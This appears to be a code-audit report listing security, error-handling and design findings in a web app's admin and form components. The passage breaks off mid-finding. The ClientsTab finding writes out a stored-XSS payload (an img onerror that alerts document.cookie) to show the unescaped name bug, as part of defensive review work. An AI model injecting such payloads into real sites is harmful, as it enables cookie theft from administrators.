### [High] Live-editable, unvalidated regex silence rules can blind the entire error-monitoring pipeline  `security` (CONFIRMED)
- **Where:** KnownIssuePanel.tsx:85-110 (addRule inserts match_kind with the raw draft.pattern, zero validation) and :132-144 (regex is a selectable match_kind); consumed server-side by triage silencing
- **What breaks:** Verified: addRule inserts {pattern, match_kind, ...} with no pattern validation, no scope cap, no test-match preview, no confirmation, applied 'live — no deploy needed' (CardDescription line 117). A match_kind='regex' pattern of '.*' or '.' silences every error platform-wide; a catastrophic-backtracking pattern is a ReDoS vector against the triage worker; and an invalid/unbalanced pattern (nothing rejects it) can make every server-side match evaluation throw, breaking triage for ALL errors, not just the silenced one. Because silencing is invisible (errors simply stop appearing in TriageTab), the error pipeline for all 767 users can go dark with no alarm — the opposite of what a health console should permit.
- **Smallest fix:** Compile/validate the pattern client- and server-side, reject empty/'.*'-class and over-long/complex patterns, require an event_type_filter for regex, show a 'would match N recent errors' preview, and require explicit confirmation before insert.

### [High] Read-only safety tiles render query errors as a green/zero 'healthy' state  `error-handling` (CONFIRMED)
- **Where:** EmailDeliverabilityCard.tsx:44-121 (no error branch; on error state=undefined → cap 50, paused=false → 'Active' green card, cappedTotal 0); EmailBulkThrottleCard.tsx:59-70 (loading-only guard, no error branch; send.data undefined → 'Normal', stuck 0); AuditPressureTab.tsx:39-107 (metaLoading only; on error meta undefined → pressure 'none')
- **What breaks:** Verified: none of these tiles handle the query error state. When the underlying select/RPC fails (RLS change, schema drift, outage), useQuery returns undefined data and the components fall through to defaults: EmailDeliverabilityCard shows a green 'Active' warm-up card with 0 frequency-capped, EmailBulkThrottleCard shows 'Normal' with 0 stuck pending, AuditPressureTab shows pressure 'NONE'. An admin looking at these panels during an incident gets a falsely reassuring all-clear exactly when the data feed is broken. A monitor that fails to green is worse than none. LoginHealthTab/PerformanceTab prove the correct pattern (explicit error branch).
- **Smallest fix:** Add an explicit error branch to each tile that renders a destructive 'couldn't load — status unknown' state, and never derive a healthy badge from absent data.

### [High] Hand-rolled useEffect fetching routes failures around the QueryCache error reporter  `dependency` (CONFIRMED)
- **Where:** KnownIssuePanel.tsx:48-65; LoginHealthTab.tsx:86-106; ProjectBlastsHealthCard.tsx:40-65; TriageTab.tsx:98-152 — useState/useEffect + supabase directly instead of useQuery from @/lib/react-query
- **What breaks:** Verified: react-query.ts wires QueryCache.onError and MutationCache.onError to report() (lines 28-41, skipping transient errors) plus the auth-aware retry policy (lines 46-63). These four tabs bypass React Query entirely and catch-then-toast locally (or, in TriageTab.runTriage:154-184, use try/finally with no catch at all), so their failures never reach report(). The System Health console is the very tool admins use to see errors, yet errors inside these panels are invisible to the platform's own reporter, and they also lose dedupe, caching, and shared retry/backoff. This duplicates what a dependency already provides and severs the observability contract.
- **Smallest fix:** Convert these four tabs to useQuery/useMutation from @/lib/react-query (as RefactorKpisTab does) so their errors flow through the shared caches; delete the hand-rolled loading/error state.

### [Medium] Outbox depth pulls up to 5000 rows to the browser and undercounts a deep queue  `under-engineering` (CONFIRMED)
- **Where:** EmailControlCenterTab.tsx:113-134 (select 'lane,status,created_at' .in(pending,sending,dlq,expired) .limit(5000), bucketed in JS, refetchInterval 30s)
- **What breaks:** Verified: per-lane pending/sending/dlq counts are derived by fetching every matching email_outbox row (hard .limit(5000)) and counting in JS every 30s. When a lane's circuit opens and the outbox backs up past 5000 — exactly the incident this panel exists to surface — the counts silently saturate at 5000 and the admin under-sees the true backlog. Worse: 'expired' rows are fetched into the same 5000 cap (line 119) but never displayed (tiles show only pending/sending/dlq), so expired rows eat cap headroom and make the pending/dlq undercount arrive sooner. It also streams thousands of rows to every admin browser every 30s. Counting belongs in the DB.
- **Smallest fix:** Replace with a server-side aggregate RPC (GROUP BY lane,status returning count + oldest), like get_email_pipeline_health already does; render the returned counts directly.

### [Medium] Unbounded email_send_log query counted client-side for the frequency-capped breakdown  `under-engineering` (CONFIRMED)
- **Where:** EmailDeliverabilityCard.tsx:76-93 (from email_send_log, .eq status frequency_capped, .gte created_at 24h ago — NO .limit, tallied in JS)
- **What breaks:** Verified: fetches every frequency_capped send in the last 24h with no row cap and tallies template_name in the browser. During a large blast with heavy capping this is thousands-to-tens-of-thousands of rows per admin per refresh (staleTime 60s), blowing memory/bandwidth and hitting PostgREST's default response ceiling — at which point the count is silently truncated to whatever the default cap returns and is wrong precisely when capping is heaviest.
- **Smallest fix:** Do the aggregation in SQL (RPC returning template_name → count) and return only the grouped rows.

### [Medium] DSAR queue selects * (PII payloads + all requester emails) unbounded; 'appeal resets SLA' is not implemented  `security` (CONFIRMED)
- **Where:** PrivacyRequestsTab.tsx:71-79 (select('*') on dsar_requests, no limit; 'all' filter applies no status filter at all); :93-103 saveDecision sets status/decision_notes/completed_at but never due_at, while :218 the UI label says 'Appealed (resets 30-day SLA on linked request)'
- **What breaks:** Verified: select('*') pulls the full payload JSON (arbitrary data-subject request content, likely PII, rendered verbatim at :208) and every requester_email into the client with no limit — a growing PII exposure in browser memory/devtools, worst under the 'all' filter which applies no status narrowing. Separately, saveDecision's patch (lines 97-102) never touches due_at, so the 'Appealed resets the 30-day SLA' promise is nowhere in the write; unless an unstated DB trigger resets due_at, the GDPR/CCPA clock silently does NOT reset and dueBadge shows a wrong countdown for appealed requests.
- **Smallest fix:** Select only the columns the list renders (drop payload; fetch it lazily on Review), add pagination/limit, and either implement the due_at reset in the write or remove the misleading label.

### [Medium] DSAR compliance KPI tiles silently read 0 when the table filter is set to Closed  `error-handling` (CONFIRMED)
- **Where:** PrivacyRequestsTab.tsx:84-91 (counts computed from the filtered `data`) feeding the 'Open requests' and 'Overdue (>30 days)' tiles at :121,:126, while the filter defaults 'open' but can be set to 'closed'/'all' at :142-149
- **What breaks:** Missed by first pass. The overdue/open KPI tiles are computed over `data`, which is the currently-filtered result set. Switch the filter to 'Closed' and `data` contains only completed/denied rows (all with completed_at set), so counts.open and counts.overdue both collapse to 0 — the two compliance headline tiles show '0 open, 0 overdue' even while overdue open DSARs exist. An admin who left the filter on Closed sees a false all-clear on the exact GDPR/CCPA SLA metric the tiles exist to guard.
- **Smallest fix:** Compute the open/overdue counts from a dedicated unfiltered aggregate (or a COUNT RPC) independent of the table's display filter, so the KPI tiles never depend on the current view.

### [Medium] Web Vitals thresholds and formatters duplicated across two performance tabs  `under-engineering` (CONFIRMED)
- **Where:** PerformanceTab.tsx:44-70 (GOOD_THRESHOLDS/POOR_THRESHOLDS, formatValue, ratingFor) duplicated in PerformanceByBrowserTab.tsx:38-60 (GOOD/POOR, fmt, chip)
- **What breaks:** Verified: identical Core Web Vitals good/poor cutoffs (LCP 2500/4000, INP 200/500, CLS 0.1/0.25, FCP 1800/3000, TTFB 800/1800) and the same ms/s/CLS formatter exist as two independent copies. When Google updates a threshold (e.g. INP) or the formatting changes, one tab gets edited and the other silently disagrees, so the same metric reads 'Good' by route and 'Needs work' by browser. Two copies of a rule always drift.
- **Smallest fix:** Extract thresholds + formatValue + ratingFor into one shared module (e.g. src/lib/web-vitals.ts) and import into both tabs.

### [Medium] AuditPressureTab re-implements SystemHealthService.getHealth/getTopErrors inline  `ownership` (CONFIRMED)
- **Where:** AuditPressureTab.tsx:41-52 (reads system_health_state id=1 .metadata) and :56-73 (rpc get_top_error_fingerprints) vs SystemHealthService.getHealth (system-health.service.ts:102-112) and getTopErrors (:114-120)
- **What breaks:** Verified: the service already owns the system_health_state singleton (id=1) read and the get_top_error_fingerprints RPC. AuditPressureTab ignores it and re-queries both by hand — reading .metadata off the same singleton row the service reads status/reason/pause_non_critical from, so two components now access one row's shape independently — and duplicates the fingerprints RPC with an ad-hoc inline result type instead of the exported ErrorFingerprint. Any change to that RPC or row shape must be fixed in two places or they diverge; the inline copy also uses (supabase as any) so drift is silent.
- **Smallest fix:** Call SystemHealthService.getTopErrors and add a service method for the pressure metadata; delete the inline queries and the (supabase as any) casts.

### [Medium] ProjectBlastsHealthCard re-runs the full RPC on every project_blasts change and never clears its error  `error-handling` (CONFIRMED)
- **Where:** ProjectBlastsHealthCard.tsx:40-65 (realtime postgres_changes on project_blasts calls load() with no debounce) and :48-51,52,67 (error set, never reset to null on later success; early return blocks recovery)
- **What breaks:** Verified: the component subscribes to every INSERT/UPDATE/DELETE on project_blasts (line 57, event '*') and calls the full get_project_blast_health RPC on each event with no debounce — a single blast updating many rows fires a burst of events → a storm of expensive RPC calls per open admin tab. And load() sets error on failure (line 49) but the success path (line 52) never calls setError(null); since the component early-returns the error card whenever error is truthy (line 67), one transient failure pins the card permanently in 'Project blasts unavailable' even after a later realtime-triggered reload succeeds.
- **Smallest fix:** Debounce/coalesce the realtime refresh (or subscribe to a coarse channel) and clear error at the start of each load(); better, move to useQuery with realtime invalidation like RefactorKpisTab.

### [Medium] TriageTab hardcodes the AI-triage daily cap (20) in three places; the server owns it  `ownership` (CONFIRMED)
- **Where:** TriageTab.tsx:269 (badge '{budgetUsed} / 20 today'), :332 (disabled when (budgetUsed ?? 0) >= 20), :163 (error copy 'Daily AI triage cap reached (20/day)') vs server-authoritative claim_triage_budget / agent_triage_budget row read at :114-123
- **What breaks:** Verified: the real budget lives in the agent_triage_budget row / claim_triage_budget RPC, but the literal 20 is copied into the UI three times. If ops raises or lowers the server cap, the badge denominator, the Triage-button disable gate, and the '429 cap reached' toast all lie, and admins get wrongly blocked or wrongly enabled from a stale client constant. Two owners of one fact.
- **Smallest fix:** Return the cap alongside triage_calls_used from the budget query/RPC and drive all three UI uses from that value.

### [Medium] Incident status writes have no concurrency guard and 'mark notified' is a bare timestamp  `ownership` (CONFIRMED)
- **Where:** IncidentsTab.tsx:115-124 (patchIncident: unconditional update by id, last-write-wins) and :248-260 ('Mark regulators/users notified' just stamp new Date().toISOString())
- **What breaks:** Verified: patchIncident does an unconditional update().eq('id') with no updated_at/optimistic-lock check. On a shared 72-hour GDPR breach record, two on-call admins acting concurrently silently overwrite each other — one admin's 'resolved' or 'notified' clobbers the other's. 'Mark regulators notified' writes only notified_regulators_at with no verification that any notice was actually sent, so the Art. 33 clock is satisfied by a click. For an Art. 33/34 audit trail this is fragile and misleading.
- **Smallest fix:** Route the update through a service RPC that compare-and-sets on updated_at and records who/when; make 'notified' reflect an actual notification event, not a bare click.

### [Medium] Unbounded select('*') on incident_response, refetched every 60s, pulls full draft notices to the browser  `under-engineering` (CONFIRMED)
- **Where:** IncidentsTab.tsx:74-85 (select('*').order('created_at') with NO limit, refetchInterval 60_000)
- **What breaks:** Missed by first pass. The incident list fetches every row of incident_response with select('*') and no limit, including the potentially large draft_regulator_notice and draft_user_notice text columns, and refetches the whole set every 60 seconds. incident_response accumulates all incidents (resolved ones are never filtered out), so this query grows unbounded over the platform's life and streams every historical breach record plus its full draft notices to each admin browser every minute — memory/bandwidth cost and eventual PostgREST truncation that would silently drop the newest incidents from the countdown view.
- **Smallest fix:** Select only the columns the list renders (exclude the draft_* bodies, fetch them lazily on Open), add a limit/pagination, and consider filtering resolved incidents older than N days.

### [Medium] Pausing an email lane is a one-click, unconfirmed action that can halt auth emails for all users  `security` (PLAUSIBLE)
- **Where:** EmailControlCenterTab.tsx:302-310 (Pause lane button → pauseMut → pause_email_lane) with no confirmation dialog; auth lane included at :240-316
- **What breaks:** Missed by first pass. The Pause lane button calls pause_email_lane immediately with a canned reason and no confirmation. Pausing the 'auth' lane stops claiming new auth emails — password resets and magic links — for all 767 users, i.e. a self-inflicted login lockout, triggered by a single mis-click on a dense grid of three lanes. Resume clears 429 counters and closes the circuit, but the window between an accidental auth-lane pause and someone noticing is pure downtime for every user trying to sign in. Destructive operational actions on the auth path should not be one unguarded click.
- **Smallest fix:** Gate Pause (at least for the auth lane) behind a ConfirmDialog naming the lane and its blast radius, and record who paused it and why.

### [Low] Type-safety bypass casts (supabase as any / as never) hide schema drift across the section  `under-engineering` (CONFIRMED)
- **Where:** AuditPressureTab.tsx:43,58; EmailDeliverabilityCard.tsx:48,64,81; PerformanceByBrowserTab.tsx:78; ProjectBlastsHealthCard.tsx:44; EmailBulkThrottleCard.tsx:81-83 (rpc + args 'as never'); mirrored in system-health.service.ts:99
- **What breaks:** Verified: these casts opt out of the generated Supabase types for tables (email_domain_health, email_send_log, system_health_state) and RPCs (web_vitals_p75_by_browser, clear_email_lane_cooldown, get_project_blast_health). When a column is renamed or an RPC signature changes, TypeScript stays silent and the failure surfaces only as a runtime error in an admin's face — and, for the hand-rolled tabs, not even in observability.
- **Smallest fix:** Regenerate/extend the Supabase types to cover these objects and remove the as any/as never casts so schema drift fails the build.

### [Low] TriageTab uses window.prompt for the permanent-silence reason inside a Radix/shadcn app  `boundary` (CONFIRMED)
- **Where:** TriageTab.tsx:220-238 (window.prompt('Why is this safe to silence permanently?', 'Known noise'), passed straight to promote_fingerprint_to_known)
- **What breaks:** Verified: a native window.prompt blocks the main thread, is unstyled/inaccessible, is inconsistent with the Dialog/ConfirmDialog used everywhere else in the console, and can be suppressed by the browser. Because it is prefilled with 'Known noise', the only guard (if (!reason) return) passes by default, so a junk or default-boilerplate reason is stored as the justification on a permanent, platform-wide silence action with no validation.
- **Smallest fix:** Replace with the existing ConfirmDialog + a Textarea and validate a non-trivial, non-default reason before calling the RPC.

### [Low] PerformanceTab default window contradicts its documented default  `other` (CONFIRMED)
- **Where:** PerformanceTab.tsx:112 (useState('1')) vs :113 fallback '|| 24' and docstring line 6 ('configurable rolling window (default 24h)')
- **What breaks:** Verified: the docstring and the numericWindow fallback both say 24h, but the initial state is '1' (Last hour). The route performance table opens on 'Last hour'; on a low-traffic route the 1h window frequently shows 'No samples in this window yet' by default, making admins think RUM is broken when it is only the default window. A minor but real first-impression/trust bug.
- **Smallest fix:** Set the initial state to '24' to match the stated default (or correct the docstring to say 1h).

### [Low] EdgeFunctionsTab reports deployed-but-erroring functions as green 'OK'  `error-handling` (CONFIRMED)
- **Where:** EdgeFunctionsTab.tsx:50-59 (anything not in data.not_deployed is assigned {status:200, ok:true}) rendered as an 'OK' badge at :119-122
- **What breaks:** Verified: the probe only distinguishes deployed vs not-deployed; every function not explicitly listed in not_deployed is painted status 200 / OK. A function that is deployed but returns 500 or is misconfigured shows a reassuring green 'OK' badge, so the probe can claim all functions healthy while a critical one is failing at runtime.
- **Smallest fix:** Label the badge 'deployed' rather than 'OK', or have edge-deploy-smoke return real per-function health so the UI can separate deployed-and-healthy from deployed-and-erroring.

### [Low] AuditPressureTab imports useQuery from @tanstack/react-query instead of the app wrapper  `dependency` (CONFIRMED)
- **Where:** AuditPressureTab.tsx:11 (import { useQuery } from '@tanstack/react-query') vs every sibling tab importing from '@/lib/react-query'
- **What breaks:** Verified: the codebase standardizes on @/lib/react-query as the single import surface that re-exports the hooks and centralizes client config. Importing straight from @tanstack breaks the convention and invites future divergence (e.g. if the wrapper later adds instrumentation to the re-exported hooks, this tab silently skips it). Today it still uses the shared client via context, so the impact is consistency/latent, not a live bug.
- **Smallest fix:** Import useQuery from '@/lib/react-query' like the siblings; add a lint rule banning direct @tanstack/react-query imports in components.

---

## Classes, courses, resources, projects & clients components

### [High] ClientsTab actions column builds raw HTML with an unescaped client name — stored HTML/JS injection  `security` (CONFIRMED)
- **Where:** src/components/clients/ClientsTab.tsx:315-322
- **What breaks:** The ag-grid 'Actions' cellRenderer returns a template string that ag-grid assigns as innerHTML, interpolating the user-supplied client name straight into two aria-label attributes and the markup: aria-label="Edit ${c.name}". A client saved with a name like "><img src=x onerror=alert(document.cookie)> (name allows 200 chars, no HTML sanitization anywhere in the create/update path) breaks out of the attribute and executes in the admin's browser every time the Clients table view renders — stored XSS on an admin-privileged surface. The card view escapes it via JSX; only the grid renderer is unsafe, so it is easy to miss.
- **Smallest fix:** Do not return an HTML string from the cellRenderer. Render real elements (a framework cellRenderer/React component) so text is escaped, or at minimum HTML-escape c.name before interpolation and drop it from the aria-labels.
- _added-in-verification_

### [Medium] ClientsTab autosave is a second writer that bypasses clientSchema validation  `ownership` (CONFIRMED)
- **Where:** src/components/clients/ClientsTab.tsx:259-269
- **What breaks:** handleSubmit validates with clientSchema (required fields, max lengths, URL format) before writing. The 30s autosave writes the raw form object directly — supabase.from("clients").update(values as any) — with no schema check, running whenever an existing client is open in the dialog. A half-edited or over-length field (e.g. website cleared, mission blanked, or pasted 10k-char summary) is silently persisted by autosave even though the validated Save path would reject it, and it races the explicit updateMutation on the same row. Two write paths for one fact with different validation = the record can hold data the app considers invalid.
- **Smallest fix:** Run clientSchema.safeParse inside the autosave onSave and skip the write on failure (or gate autosave on the form being valid), so both writers enforce the same invariant — ideally behind one clientService.update.
- _added-in-verification_

### [Medium] Both certification tabs fetch all rows with no user scoping, trusting RLS entirely  `security` (PLAUSIBLE)
- **Where:** src/components/ClassCertificationsTab.tsx:54-58 / src/components/ProjectCertificationsTab.tsx:54-57
- **What breaks:** useCertifications / useProjectCertifications select from class_certifications / project_certifications with only .order(synced_at) — no .eq("user_id", ...) filter; userId is used only to gate `enabled`. The sibling useProfileName query in the same files DOES filter by user_id, so the omission is asymmetric and easy to read as intentional. These are Airtable-synced PII tables (names, registration history). If the RLS policy on either table is ever missing, disabled, or loosened during a migration, this query returns every member's masterclass and project history to any authenticated user, with zero defense-in-depth at the read site. Cross-tenant data exposure that no test or the mechanical gate would catch.
- **Smallest fix:** Add an explicit .eq("user_id", userId) to both queries so the client scopes to the owner regardless of RLS state; keep RLS as the enforcement layer, not the only layer.
- _added-in-verification_

### [Medium] Privileged/bulk edge calls bypass auditedInvoke; failures never reach operators  `error-handling` (CONFIRMED)
- **Where:** src/components/recruiting/ProjectBlastComposer.tsx:87 (also ClassCertificationsTab.tsx:145, ProjectCertificationsTab.tsx:160)
- **What breaks:** send-project-blast emails and in-app-notifies every completed applicant of a project — exactly the privileged action decisions.md rule 4 says must route through auditedInvoke/invokeEdge (both wrappers exist at src/integrations/supabase/audited-invoke.ts and src/lib/edge/invokeEdge.ts and are used elsewhere). These call sites use raw supabase.functions.invoke and, on failure, only toast the user; there is no report() to operators. A partially-failed blast (some emails sent, function then errors) or a systemic send outage is invisible to operators — the exact silent-failure class the rule targets, on a high-blast-radius action.
- **Smallest fix:** Route these invokes through auditedInvoke/invokeEdge (which report + retry), or add an explicit report(e) in each catch alongside the toast.
- _added-in-verification_

### [Medium] UI hard-deletes clients and projects with no referential/orphan handling  `ownership` (PLAUSIBLE)
- **Where:** src/components/clients/ClientsTab.tsx:201-208 / src/components/clients/ProjectsTab.tsx:69-76
- **What breaks:** deleteMutation issues supabase.from("clients"|"projects").delete().eq("id", id) with no dependency check. A client is referenced by projects.client_id; a project is referenced by project_applications and roster rows. Depending on the FK definition this is either a raw Postgres error surfaced verbatim to the admin as a toast (confusing, no guidance) or — if any relation is ON DELETE CASCADE — a silent mass-deletion of applications/roster history triggered by one 'Delete client' click. The confirm dialog promises only that 'the client record will be permanently removed', hiding the true scope. No soft-delete or block-when-referenced.
- **Smallest fix:** Move deletion behind a service that checks for dependent projects/applications and refuses (or explains the cascade) before deleting; make the confirmation state what else will be destroyed.
- _added-in-verification_

### [Low] ProjectCertificationsTab casts (supabase as any), defeating generated-type checking  `dependency` (CONFIRMED)
- **Where:** src/components/ProjectCertificationsTab.tsx:54
- **What breaks:** The query uses (supabase as any).from("project_certifications") — the cast suppresses the generated Database types, meaning the table/columns aren't in the typed schema. A rename or column change to project_certifications produces no compile error; it fails silently at runtime returning an error the tab surfaces as a generic failure. The class-certifications sibling is typed, so this table has drifted out of the type-safety net unnoticed.
- **Smallest fix:** Regenerate Supabase types to include project_certifications and remove the `as any`, or add a typed row interface at the query boundary.
- _added-in-verification_

### [Low] ClientsTab logo upload after create is non-atomic and swallowed to console only  `error-handling` (CONFIRMED)
- **Where:** src/components/clients/ClientsTab.tsx:155-164
- **What breaks:** createMutation inserts the client, then uploads the logo and updates logo_url as separate steps. On upload/update failure the error is caught and logged with console.error only, then flagged so the user sees a warning toast. Per decisions.md rule 4, console.error is not operator reporting (the logger only writes to the browser console), so repeated logo-upload failures (e.g. a broken client-logos bucket policy) are invisible to operators; the user-facing warning is the only signal. Partial state (client exists, no logo) is recoverable via Edit, which limits severity.
- **Smallest fix:** Replace the console.error with the app's report()/error-reporter so the operator sees a trend, keeping the existing user warning.
- _added-in-verification_

---

## Applications, forms, registration, agreements & feedback components

### [High] Contributor can legally sign a community agreement whose body failed to load  `error-handling` (CONFIRMED)
- **Where:** src/components/agreements/CommunityAgreementSheet.tsx:38-51 (version query), 98 (safeHtml), 116-127 + 135-158 (render/sign UI)
- **What breaks:** The version useQuery destructures only { data: version, isLoading } — isError is never read. queryFn throws on error (line 46) and uses .single() (line 45), which also throws if zero or multiple is_current rows exist. On any of these, versionLoading goes false, version stays undefined, safeHtml collapses to "" (line 98), and the ScrollArea renders an EMPTY prose div while the enabled 'I agree' checkbox and 'Agree and continue' button still show. A contributor affirms 'I have read and agree to the Community Contributor Terms', clicks, and sign_community_agreement records a binding signature against terms that never rendered. This gates team-training start — a consent/legal-integrity defect.
- **Smallest fix:** Read isError from the version query; when the query errors or returns null, render an error+retry state and do NOT render the agree checkbox/submit button. Guard the sign UI on `version` being present.

### [High] Agreement signing reaches straight into Supabase from the component, bypassing hooks/services  `boundary` (CONFIRMED)
- **Where:** src/components/agreements/CommunityAgreementSheet.tsx:3, 41-96
- **What breaks:** The component owns the whole data workflow: two raw supabase.from(...) reads (lines 41-45, 56-60), a supabase.rpc('sign_community_agreement') write (line 74), and four hand-listed invalidateQueries calls (lines 85-88). Intended layering is UI -> hooks -> services -> integrations; this is UI -> database inside a view. The signing workflow is trapped in this one caller and cannot be reused by the roster/admin surfaces that clearly also track signature status (they own dashboard-agreement-status / roster-agreement-status keys), so the next caller copies it and the two drift. Nothing is unit-testable without a component, and the cache-invalidation contract lives in a view instead of next to the mutation.
- **Smallest fix:** Move both queries and the sign mutation into a useCommunityAgreement(applicationId) hook backed by an agreement service; the component consumes data + a sign() callback and owns no Supabase calls or invalidation keys.

### [High] Password policy is re-implemented in the UI as a third source of truth  `ownership` (CONFIRMED)
- **Where:** src/components/registration/PasswordRequirementsList.tsx:3-9 vs src/lib/validators/auth.ts:35-45 (isStrongPassword) and 69-76 (passwordSchema)
- **What breaks:** The rule set (>=12, upper, lower, digit, special) is authored a third time in the component's passwordRequirements array, independent of isStrongPassword and passwordSchema. Two concrete failures: (1) both validators enforce max 128 chars (auth.ts:39, 72); the checklist never shows a max rule, so a 130-char password lights every row green yet registerSchema rejects it with no matching cue. (2) When the real policy changes (14 chars, a blocklist, etc.), this hardcoded array keeps showing all-green for a password the server rejects — the UI actively lies about acceptability, driving failed signups and support load.
- **Smallest fix:** Export the rule set (label + predicate) once from auth.ts alongside passwordSchema and render the checklist from that single source so it cannot diverge; include the max-length rule.

### [Medium] `as any` casts on agreement tables and RPC disable the check that catches schema drift  `dependency` (CONFIRMED)
- **Where:** src/components/agreements/CommunityAgreementSheet.tsx:42, 57, 74
- **What breaks:** from('community_agreement_versions' as any), from('community_agreement_signatures' as any), and rpc('sign_community_agreement' as any) throw away the generated Supabase types on the table/function identifiers. If a column is renamed, a table dropped, or the RPC param names change, TypeScript stays silent and the failure surfaces only at runtime as a PostgREST error users hit in prod. Repo memory records a prior Discord-linking outage of exactly this class (PGRST202, migration never applied); these casts guarantee the compiler cannot warn next time.
- **Smallest fix:** Regenerate Supabase types to include these tables/RPC and drop the `as any`. If types genuinely lag, cast only the narrow return shape, never the table/function identifier, so a rename is a compile error.

### [Medium] AgreementResendButton invokes an edge function directly from the component  `boundary` (CONFIRMED)
- **Where:** src/components/agreements/AgreementResendButton.tsx:4, 20-22
- **What breaks:** handleClick calls supabase.functions.invoke('send-community-agreement-trigger', { body: { application_id } }) inline. Same layering breach as the sheet: the 'resend agreement' side effect (email/notification trigger) has no service owner, so any other surface that needs to resend must duplicate the function name, body shape, and toast handling. Rename the edge function or change its body contract and every copy silently breaks with no compile-time signal.
- **Smallest fix:** Wrap the invoke in an agreement service method (e.g. resendAgreementRequest(applicationId)) called from a mutation hook; the button only triggers the mutation.

### [Medium] Long-form char limit hardcoded in two components, divorced from the validator  `ownership` (CONFIRMED)
- **Where:** src/components/general-application/LongFormQuestion.tsx:33 (maxLength={5000}), 38 ('/ 5,000') and SectionProfile.tsx:155, 159 vs src/lib/validators/general-application.ts:12 (MAX_LONG=5000, surfaced via FIELD_MAX_LENGTHS)
- **What breaks:** Both the maxLength={5000} enforcement and the literal '5,000' in the counter are typed by hand in the components, while the validator owns MAX_LONG=5000 and getFieldErrors enforces it via FIELD_MAX_LENGTHS. Raise MAX_LONG to 8000 and every textarea keeps hard-truncating at 5000 while getFieldErrors believes 8000 is allowed — users silently lose typed characters with the counter reading '/ 5,000'. Three independent numbers kept in sync only by memory.
- **Smallest fix:** Export MAX_LONG from the validator and use it for both the maxLength attribute and the displayed limit in LongFormQuestion and SectionProfile.

### [Medium] Char-count textarea hand-rolled twice despite design-system CharCountTextarea  `under-engineering` (CONFIRMED)
- **Where:** src/components/general-application/LongFormQuestion.tsx:28-39 and SectionProfile.tsx:150-159 vs src/design-system/components/molecules/CharCountTextarea.tsx
- **What breaks:** The design system ships CharCountTextarea (label-less but maxLength-defaulted, and its counter carries aria-live so AT announces the count). LongFormQuestion re-implements textarea+count+aria, and SectionProfile's Professional Goals block re-implements the same thing a third time inline rather than reusing LongFormQuestion. Both hand-rolled counters lack the aria-live the DS component has, so they are also strictly worse for screen readers. Three divergent implementations mean a11y/count/near-limit fixes must land in three places and will drift.
- **Smallest fix:** Have LongFormQuestion wrap the design-system CharCountTextarea and replace SectionProfile's inline goals textarea with a LongFormQuestion instance.

### [Medium] Autosave 'Reload form' destroys unsaved in-memory edits while telling the user their typing is safe  `error-handling` (CONFIRMED)
- **Where:** src/components/forms/AutosaveCircuitBanner.tsx:54-62 (transient/unknown), 26-32 (auth_lost), 76-84 (reload button) — confirmed against src/hooks/use-autosave.ts
- **What breaks:** For transient/unknown the body reads 'Your typing is safe' with showReload:true; auth_lost says 'Your unsaved changes are kept locally for now.' Both claims are false: use-autosave keeps the draft ONLY in valueRef (in-memory) — there is no localStorage/IndexedDB persistence anywhere in the hook. The circuit opened precisely because the latest edits did NOT reach the server, and the Reload button defaults to window.location.reload() (line 80), which wipes React state and valueRef. So the user is handed a data-loss button under copy that promises their work is saved, on the exact path where it is not.
- **Smallest fix:** Persist the current draft to a durable local store before offering Reload, or drop Reload for transient/unknown/auth_lost/permission; keep it only where the draft is known-persisted (schema_drift after a local snapshot). Fix the 'kept locally' / 'typing is safe' copy so it is true.

### [Medium] Draft-discard failure is swallowed — dialog hangs with no error  `error-handling` (CONFIRMED)
- **Where:** src/components/forms/DraftRestoredBanner.tsx:65-73
- **What breaks:** onConfirm does try { await onDiscard(); setConfirmOpen(false); } finally { setLoading(false); } with no catch. If onDiscard rejects (network/RLS failure deleting the server draft), setConfirmOpen(false) is skipped, no toast or inline error fires, loading resets, and the dialog returns to idle. The user clicks Discard, nothing visibly changes, clicks again — the failure neither recovers, retries, nor reports. Meanwhile the draft they believe is gone is still on the server and will be restored on next mount.
- **Smallest fix:** Add a catch that surfaces the failure (toast/inline error) and keeps the dialog open so the user knows the discard did not take effect.

### [Medium] Form components reach into @/components/ui internals instead of the @/design-system entrypoint  `dependency` (CONFIRMED)
- **Where:** src/components/general-application/SectionProfile.tsx:2-18; SectionEngagement.tsx:1-2; agreements/CommunityAgreementSheet.tsx:4-7; feedback/FeedbackDetailPanel.tsx:1-9; forms/DraftRestoredBanner.tsx:4-6
- **What breaks:** Sibling files in this very subtree — SectionBasicInfo.tsx:1, LongFormQuestion.tsx:1, AutosaveCircuitBanner.tsx:2 — import primitives (Input, Label, Textarea, Button, Alert) from @/design-system, while these files import the same primitives (Sheet, Button, Checkbox, ScrollArea, Popover, Command, Input, Textarea, Label, MultiSelect) from @/components/ui/*. Two public surfaces for one component set means a design-system-wide change (theming, an a11y default, a prop rename) lands on half the forms and silently misses the other half, with no single import to enforce.
- **Smallest fix:** Import every primitive from @/design-system and add a lint rule banning deep @/components/ui imports from feature components.

### [Medium] Signature state trusts stale client query — no idempotency against double/concurrent signing  `ownership` (PLAUSIBLE)
- **Where:** src/components/agreements/CommunityAgreementSheet.tsx:53-65 (maybeSingle query), 99 (alreadySigned), 150-153 (submit)
- **What breaks:** alreadySigned is derived purely from a client-cached maybeSingle query. If that query errored or is stale (a second tab, or another admin acted), signature is null, the sign UI reappears, and the user can fire sign_community_agreement again. Whether that yields a duplicate signature row, an error, or a silent overwrite depends entirely on server-side idempotency the component does not establish. At ~767 users with multi-device sessions this is a real duplicate-signature / overwritten-timestamp risk. (Server-side RPC/constraints not visible in this section — hence PLAUSIBLE.)
- **Smallest fix:** Enforce a unique constraint on (application_id) in the signatures table and make the RPC upsert/no-op on conflict; treat client alreadySigned as a hint only and re-check server-side inside the RPC.

### [Medium] Stale agreement status elsewhere if hand-listed invalidation keys don't match  `ownership` (PLAUSIBLE)
- **Where:** src/components/agreements/CommunityAgreementSheet.tsx:85-88
- **What breaks:** On success the component invalidates four query keys by hand: community-agreement-signature/applicationId, my-project-app-status/applicationId, dashboard-agreement-status, roster-agreement-status — all shaped by guesswork in this file. If any reader defines its key with a different shape (e.g. ['dashboard-agreement-status', userId]), the invalidate silently no-ops and the dashboard/roster keep showing the contributor as 'unsigned' after signing, blocking or confusing their training start until a hard refresh. No compile-time link ties these string literals to the real query definitions.
- **Smallest fix:** Centralize agreement-status query keys in one exported keys factory used by both the readers and this mutation, so an invalidation cannot target a non-existent key shape.

### [Medium] Signing a superseded agreement version is treated as already-signed; new terms never re-prompted  `ownership` (CONFIRMED)
- **Where:** src/components/agreements/CommunityAgreementSheet.tsx:53-65 (signature incl. version_id), 99 (alreadySigned), 130-134
